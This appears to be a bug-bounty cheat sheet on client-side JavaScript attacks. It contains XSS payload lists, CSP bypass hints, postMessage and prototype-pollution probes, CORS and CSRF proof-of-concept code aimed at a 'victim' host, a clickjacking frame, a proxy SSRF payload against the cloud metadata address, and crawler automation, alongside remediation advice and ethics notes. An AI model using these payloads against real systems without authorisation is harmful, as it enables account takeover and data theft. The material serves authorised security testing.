---
icon: square-js
---

# Javascript 4 Bug Bounties

## **JavaScript for Bug Bounties — Client-Side Offense & Automation**

***

### I. 🧩 Recon Mindset (Client-Side)

* **Map all sources → sinks**: URL, DOM, storage, postMessage → `innerHTML`, `eval`, `location`, dynamic script loads.
* **Inventory scripts**: first/third-party, versions, feature flags, minified bundles (look for `//# sourceMappingURL`).
* **Trace dataflows**: Grep for `dangerous` APIs; use DevTools “Search All Files”.

Quick DevTools searches:

```
innerHTML|outerHTML|insertAdjacentHTML|document.write|eval|setTimeout\(|Function\(|postMessage\(|addEventListener\('message'|JSON\.parse\(|DOMPurify|sanitize
```

***

### II. ⚔️ DOM XSS — Sources & Sinks

#### Common **Sources**

* `location.hash`, `location.search`, `document.referrer`, `window.name`
* `localStorage/sessionStorage` values
* `postMessage` event `data`

#### Dangerous **Sinks**

* `element.innerHTML/outerHTML/insertAdjacentHTML`
* `document.write`
* `eval/Function/setTimeout(string)`
* `jQuery($html)` or `.html()`
* `srcdoc`, `on*=` attributes

#### Fast Test Payloads (by context)

```
# HTML context
"><img src=x onerror=alert(1)>
# Attribute context
" autofocus onfocus=alert(1) x="
# JS string context
';alert(1);// 
# URL JS schemes (if allowed)
javascript:alert(1)
# SVG
<svg/onload=alert(1)>
```

**Minimal sink probe (console):**

```js
// Try to push payloads through suspected sources:
new URLSearchParams(location.search).forEach((v,k)=>console.log(k,v))
```

***

### III. 🛡️ CSP Bypass Hints (When Present)

* Check `script-src` for `unsafe-inline`, `nonce-`, `strict-dynamic`, `data:`, `blob:`.
* If `script-src` lacks `'unsafe-eval'`, look for **JSONP**/trusted JS endpoints or **import()** allowed origins.
* **`style-src 'unsafe-inline'`** + CSS escape to JS? (rare, mostly historical).
* **`object-src 'none'`** reduces legacy vectors; still test SVG/`srcdoc`.

**Blob URL pivot (if `blob:` allowed):**

```js
URL.createObjectURL(new Blob(["alert(1)"],{type:"text/javascript"}))
```

***

### IV. 🧪 postMessage & Click-through

#### Weak origin checks

Anti-pattern:

```js
window.addEventListener('message', e => {
  // no e.origin check
  if (e.data.cmd === 'login') { doLogin(e.data.token) }
})
```

Exploit (attacker page):

```js
iframe.contentWindow.postMessage({cmd:'login', token:'X'}, '*')
```

**Fix to propose**: enforce strict `e.origin === 'https://trusted.example'` and structural checks.

***

### V. 🧬 Prototype Pollution → XSS/RCE (Frontend)

#### Quick probes (DevTools):

```js
// URL param gadget: ?__proto__[payload]=value
Object.prototype.pwned=1;({}).pwned // → 1?
```

If polluted → hunt gadget sinks (templating, DOM renderers):

```js
// Common gadget keys
{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}  // depends on framework
```

Framework-specific hotspots: lodash `_.merge`, deep clone utilities without `hasOwnProperty` checks.

***

### VI. 🌐 CORS Misconfig (Client-side observable)

**Red flags**

* `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (should never co-exist)
* Reflection of `Origin` header from arbitrary domains

**Quick POC (console from attacker origin):**

```js
fetch('https://victim/api/me', {credentials:'include', mode:'cors'})
 .then(r=>r.text()).then(t=>console.log(t))
```

***

### VII. 🩸 CSRF & Fetch/Forms

* **SameSite=Lax/Strict** can block simple GET/POST; test with **CORS preflighted** or **same-site top-level navigation**.
* Hidden CSRF if API trusts `X-Requested-With` or referer only.

**Auto-submit form (classic CSRF)**

```html
<form action="https://victim/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form><script>document.forms[0].submit()</script>
```

**fetch CSRF with cookies** (attacker origin):

```js
fetch('https://victim/profile', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({role:'admin'})
})
```

***

### VIII. 📦 Storage & Token Handling

* Hunt for `access_token` in `localStorage`, `sessionStorage`, `IndexedDB`.
* If tokens stored in `localStorage` and any XSS exists → full account takeover.

**Quick dump (DevTools):**

```js
Object.keys(localStorage).forEach(k=>console.log(k, localStorage.getItem(k)))
```

***

### IX. 🛰️ Service Workers & Cache Poisoning (Client)

* Service Worker scope controls network responses; XSS in SW = persistent control.
* Check:

```js
navigator.serviceWorker.getRegistrations().then(r=>r.forEach(sw=>console.log(sw.scope)))
```

* Test cache poisoning via query variation if SW does naive cache keys.

***

### X. 🔎 JSONP, Callback & AngularJS Legacy

**JSONP** endpoints:

```
/api?callback=alert(1)
/endpoint?cb=foo
```

If response wraps attacker-controlled callback → JS execution.

**AngularJS sandbox escape** (very legacy):

```html
{{constructor.constructor('alert(1)')()}}
```

Only applicable to very old Angular versions with untrusted templates.

***

### XI. 🧰 Quick Automation (Browser & Node)

#### A) **Bookmarklets** (drop-in helpers)

Save as bookmarks; click on target pages.

* **Params to console**

```js
javascript:(()=>{const u=new URL(location);console.table([...u.searchParams.entries()])})()
```

* **Highlight sinks**

```js
javascript:(()=>{const bad=['innerHTML','outerHTML','insertAdjacentHTML'];bad.forEach(p=>{const d=Object.getOwnPropertyDescriptor(Element.prototype,p);Object.defineProperty(Element.prototype,p,{set(v){console.log('[SINK]',p,this,v.slice?.(0,120));return d.set.call(this,v)},get:d.get})})})()
```

#### B) **Tampermonkey userscript** (param reflection hunting)

```js
// ==UserScript==
// @match       *://*/*
// @grant       none
// ==/UserScript==
(function(){
  const q = new URL(location).searchParams;
  for (const [k,v] of q) {
    if (document.body?.innerHTML.includes(v)) {
      console.log('[REFLECTION]', k, v);
    }
  }
})();
```

#### C) **Node + Puppeteer** (crawl & reflection detector)

```js
import puppeteer from 'puppeteer';
const start = process.argv[2];
const browser = await puppeteer.launch({headless:'new'});
const page = await browser.newPage();
await page.goto(start,{waitUntil:'domcontentloaded'});

const params = [['x','"><img src=x onerror=alert(1)>'], ['q','%27;alert(1)//']];
for (const [k,p] of params){
  const url = new URL(start); url.searchParams.set(k,p);
  await page.goto(url.toString(),{waitUntil:'domcontentloaded'});
  const reflects = await page.evaluate(v=>document.documentElement.innerHTML.includes(v), p);
  if (reflects) console.log('[REFLECTS]', k, url.toString());
}
await browser.close();
```

***

### XII. 🛰️ Client-Side SSRF-ish (fetch to internal)

Modern browsers block direct intranet access from foreign origins, but **misconfigured CORS** or **proxy endpoints** can enable internal fetches:

* Endpoints like `/proxy?url=http://169.254.169.254/latest/meta-data/`
* **PDF renderers / image fetchers** server-side → try internal targets.

Payload:

```
/proxy?url=http://127.0.0.1:8080/admin
```

***

### XIII. 🪤 Clickjacking & UI Redress

* Test X-Frame-Options / CSP `frame-ancestors`.
* If frameable, attempt **overlayed button** click.

Test page:

```html
<iframe id=f src="https://victim/transfer"></iframe>
<style>#f{position:absolute;opacity:.001;top:10px;left:10px;width:800px;height:600px;border:0}</style>
```

***

### XIV. 🧵 Race/Logic in JS Apps

* Double-submit, re-order API calls, optimistic UI updates.
* Test **idempotency**: place two `fetch()` concurrently and observe server state.

```js
Promise.all([
 fetch('/api/apply-coupon',{method:'POST'}),
 fetch('/api/apply-coupon',{method:'POST'})
])
```

***

### XV. 🧠 Reporting Notes (for bounty writeups)

* **Proof**: reproducible URL + parameter + payload + video/GIF.
* **Impact**: account takeover, data read/write, CSRF state change.
* **Scope awareness**: third-party domains often out of scope unless documented.
* **Fix guidance**:
  * Use safe sinks: `textContent`, `setAttribute`.
  * Validate `postMessage` origins.
  * Store tokens in **httpOnly** cookies + SameSite.
  * Strict CSP with nonces; disallow `data:`/`blob:` where possible.

***

### XVI. ⚡ Quick Reference Tables

#### A) Dangerous Sinks

| Sink                | Safe Alternative                          |
| ------------------- | ----------------------------------------- |
| `innerHTML`         | `textContent`, sanitized HTML (DOMPurify) |
| `document.write`    | DOM APIs                                  |
| `eval`, `Function`  | Strict logic, `JSON.parse`                |
| `setTimeout("...")` | `setTimeout(fn)`                          |

#### B) Useful One-Liners

```js
// show cookies & SameSite flags (DevTools Application tab is better)
document.cookie

// list event listeners (Chrome DevTools command menu > Show listeners), or programmatic:
getEventListeners ? getEventListeners(document) : 'Use DevTools'

// enumerate scripts
[...document.scripts].map(s=>s.src || '[inline]')
```

#### C) Payload Starters

```
"><svg/onload=alert(1)>
" onpointerenter=alert(1) a="
<iframe srcdoc="<script>alert(1)</script>"></iframe>
javascript:/*url*/alert(1)
```

***

### XVII. ✅ Clean OPSEC & Ethics

* Test on allowed assets only, throttle automation, label requests with a contact header if policy allows.
* Keep raw HTTP traces and console logs for your report; do **not** retain user data.
* Provide remediation PRs/snippets when possible — it boosts acceptance.

***
